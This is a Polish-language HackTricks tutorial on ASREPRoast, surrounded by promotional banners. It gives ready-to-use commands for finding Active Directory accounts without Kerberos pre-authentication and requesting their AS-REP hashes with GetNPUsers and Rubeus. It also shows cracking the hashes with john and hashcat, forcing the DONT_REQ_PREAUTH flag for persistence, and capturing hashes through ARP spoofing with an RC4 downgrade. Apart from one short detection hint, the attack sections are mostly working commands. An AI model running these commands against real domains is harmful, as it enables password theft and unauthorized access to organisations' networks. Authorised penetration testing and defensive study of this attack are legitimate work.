# ASREPRoast

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Dołącz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hakerami i łowcami błędów!

**Spojrzenie na Hacking**\
Zanurz się w treściach, które zagłębiają się w emocje i wyzwania hackowania

**Aktualności z Hackingu na Żywo**\
Bądź na bieżąco z szybkim tempem świata hackowania dzięki aktualnościom i spojrzeniom na żywo

**Najnowsze Ogłoszenia**\
Bądź na bieżąco z najnowszymi programami bug bounty i istotnymi aktualizacjami platform

**Dołącz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij współpracować z najlepszymi hakerami już dziś!

## ASREPRoast

ASREPRoast to atak bezpieczeństwa, który wykorzystuje użytkowników, którzy nie posiadają atrybutu **wymaganego wstępnego uwierzytelnienia Kerberos**. W zasadzie ta podatność pozwala hakerom żądać uwierzytelnienia dla użytkownika od kontrolera domeny (DC) bez konieczności znajomości hasła użytkownika. Następnie DC odpowiada wiadomością zaszyfrowaną kluczem pochodzącym z hasła użytkownika, który hakerzy mogą próbować złamać offline, aby odkryć hasło użytkownika.

Główne wymagania dla tego ataku to:
- **Brak wstępnego uwierzytelnienia Kerberos**: Użytkownicy docelowi muszą nie mieć tej funkcji bezpieczeństwa włączonej.
- **Połączenie z kontrolerem domeny (DC)**: Hakerzy potrzebują dostępu do DC, aby wysyłać żądania i odbierać zaszyfrowane wiadomości.
- **Opcjonalne konto domenowe**: Posiadanie konta domenowego pozwala hakerom bardziej efektywnie identyfikować podatnych użytkowników poprzez zapytania LDAP. Bez takiego konta hakerzy muszą zgadywać nazwy użytkowników.


#### Wyliczanie podatnych użytkowników (wymagane poświadczenia domenowe)

{% code title="Korzystając z systemu Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Korzystając z systemu Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Wymagaj wiadomości AS_REP

{% code title="Korzystając z systemu Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Korzystanie z systemu Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting z Rubeusem wygeneruje 4768 z typem szyfrowania 0x17 i typem wstępnej autoryzacji 0.
{% endhint %}

### Łamanie
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Trwałość

Wymuś brak wymaganej **preautentykacji** dla użytkownika, dla którego masz uprawnienia **GenericAll** (lub uprawnienia do zapisywania właściwości):

{% code title="Korzystając z systemu Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Korzystając z systemu Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASreproast bez poświadczeń
Bez wiedzy użytkowników, którzy nie wymagają wstępnej autoryzacji Kerberos, atakujący może wykorzystać pozycję człowieka pośredniego do przechwytywania pakietów AS-REP w trakcie przesyłania po sieci.<br>
[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) pozwala nam to zrobić. Co więcej, narzędzie <ins>zmusza stanowiska klientów do korzystania z RC4</ins>, zmieniając negocjacje Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher.py relay -dc $DC_IP --keep-spoofing

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher.py relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASrepCatcher.py listen
```
## Odnośniki

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Dołącz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hakerami i łowcami błędów!

**Spojrzenie na Hacking**\
Zanurz się w treściach, które zgłębiają emocje i wyzwania związane z hakowaniem

**Aktualności z Hackingu na Żywo**\
Bądź na bieżąco z szybkim tempem świata hakowania dzięki aktualnościom i spojrzeniom na żywo

**Najnowsze Ogłoszenia**\
Bądź na bieżąco z najnowszymi programami bug bounty i istotnymi aktualizacjami platform

**Dołącz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij współpracować z najlepszymi hakerami już dziś!

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
